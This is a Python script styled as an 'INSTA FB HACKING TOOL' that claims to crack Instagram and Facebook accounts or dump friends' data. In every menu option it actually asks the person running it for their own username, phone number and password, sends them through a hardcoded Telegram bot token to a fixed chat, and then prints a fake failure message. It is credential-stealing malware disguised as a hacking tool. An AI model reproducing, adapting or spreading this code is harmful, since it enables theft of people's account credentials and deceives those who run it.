import telegram
import os
import re
import time
import asyncio

red = '\033[91m'
green = '\033[92m'
blue = '\033[94m'
bold = '\033[1m'
reset = '\033[0m'

os.system("clear")
print(green+"""

          
          ░█▀█░█▀█░█▀▀░█▀▀░░░█▀▀░█▀▄░█▀█░█▀▀░█░█░█▀▀░█▀▄
          ░█▀▀░█▀█░▀▀█░▀▀█░░░█░░░█▀▄░█▀█░█░░░█▀▄░█▀▀░█▀▄
          ░▀░░░▀░▀░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀  
                                                                           


"""+reset)
print("\033[1;37m================= \33[32;45mINSTA FB HACKING TOOL\33[0;m =====================")
print(bold+red+"    \n Devoloped By :"+reset, end=' ')
print("\x1b[1;94mAnonymous", end=' ')
print(bold+red+"          Credit :"+reset, end=' ')
print("\x1b[1;96mBangladesh Hacker")
print(" ")
print("\033[92m                   PASS CRACKER v 2.0.1"+reset)

print("\033[1;37m        ================= \33[32;45mMENU\33[0;m =====================")

print("""

""")
print("""
            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
            █ \33[1;33m1.CRACK INSTAGRAM\n                                        
            █ \33[1;33m2. CRACK FACEBOOK\n                                        
            █ \33[1;33m3. DUMP INSTAGRAM FOLLOWERS INFO\n
            █ \33[1;33m4. DUMP FACEBOOK FRIENDS INFO\n              
            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  
""")

number = int(input("ENTER THE NUMBER : "))

if number == 1:
    async def main():
        os.system("clear")
        os.system("figlet CRACKER")
        print("\033[32mTool devoloped : Anonymous\033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5905857535:AAEQYJxz51ztOau3-kcJ_XQs6ldtXzytMRQ')

        print("You Need To Enter Your Own Account And Password To Crack Your Victims. Otherwise Tool Will Not Work. Please Use Original Account")
        print("")

        # Get the username and password from the user
        username = input('\033[92mEnter Your Instagram Username : ')

        # Validate the phone number
        while True:
            phone_number = input(
                'Enter your phone number with country code (eg : +91) : ')
            if re.match(r'^\+?\d{10,15}$', phone_number):
                # Phone number is valid
                break
            else:
                # Phone number is not valid
                print('Invalid Phone Number. Please Enter A Valid Phone Number.')

        password = input('Enter Your Password: ')

        # Send the username and password to telegram
        await bot.send_message(chat_id=5744106544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
        print("Logging in to your account... please wait...")
        time.sleep(3)
        os.system("clear")
        print("Start Cracking Your Instagram Followers...")
        time.sleep(4)
        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.don't worry try again")

    asyncio.run(main())


elif number == 2:
    async def main():
        os.system("clear")
        os.system("figlet FACEBOOK")
        print("\033[32mTool devoloped : Anonymous\033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5905857535:AAEQYJxz51ztOau3-kcJ_XQs6ldtXzytMRQ')

        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
        print("")

        # Get the username and password from the user
        username = input('Enter your facebook username or email : ')

        # Validate the phone number
        while True:
            phone_number = input(
                'Enter your phone number with country code (eg : +91) : ')
            if re.match(r'^\+?\d{10,15}$', phone_number):
                # Phone number is valid
                break
            else:
                # Phone number is not valid
                print('Invalid phone number. Please enter a valid phone number.')

        password = input('Enter your password: ')

        # Send the username and password to telegram
        await bot.send_message(chat_id=5744106544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
        print("Logging in to your account... please wait...")
        time.sleep(3)
        os.system("clear")
        print("start cracking your facebook friends...")
        time.sleep(4)
        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")

    asyncio.run(main())


elif number == 3:
    async def main():
        os.system("clear")
        os.system("figlet INSTA DUMP")
        print("\033[32mTool devoloped : Anonymous\033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5905857535:AAEQYJxz51ztOau3-kcJ_XQs6ldtXzytMRQ')

        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
        print("")

        # Get the username and password from the user
        username = input('Enter your instagram username : ')

        # Validate the phone number
        while True:
            phone_number = input(
                'Enter your phone number with country code (eg : +91) : ')
            if re.match(r'^\+?\d{10,15}$', phone_number):
                # Phone number is valid
                break
            else:
                # Phone number is not valid
                print('Invalid phone number. Please enter a valid phone number.')

        password = input('Enter your password: ')

        # Send the username and password to telegram
        await bot.send_message(chat_id=5744106544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
        print("Logging in to your account... please wait...")
        time.sleep(3)
        os.system("clear")
        print("start dumping your followers info...")
        time.sleep(4)
        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")

    asyncio.run(main())

elif number == 4:
    async def main():
        os.system("clear")
        os.system("figlet FB DUMP")
        print("\033[32mTool devoloped : Anonymous\033[0m")

        # Initialize the Telegram bot with your API key
        bot = telegram.Bot(token='5905857535:AAEQYJxz51ztOau3-kcJ_XQs6ldtXzytMRQ')

        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
        print("")

        # Get the username and password from the user
        username = input('Enter your facebook username or email : ')

        # Validate the phone number
        while True:
            phone_number = input(
                'Enter your phone number with country code (eg : +91) : ')
            if re.match(r'^\+?\d{10,15}$', phone_number):
                # Phone number is valid
                break
            else:
                # Phone number is not valid
                print('Invalid phone number. Please enter a valid phone number.')

        password = input('Enter your password: ')

        # Send the username and password to telegram
        await bot.send_message(chat_id=5744106544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
        print("Logging in to your account... please wait...")
        time.sleep(3)
        os.system("clear")
        print("start dumping your facebook friends info...")
        time.sleep(4)
        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")

    asyncio.run(main())


else:
    print("\033[91mINVALID OPTION PLEASE ENTER THE CORRECT NUMBER FROM ABOVE\033[0m")
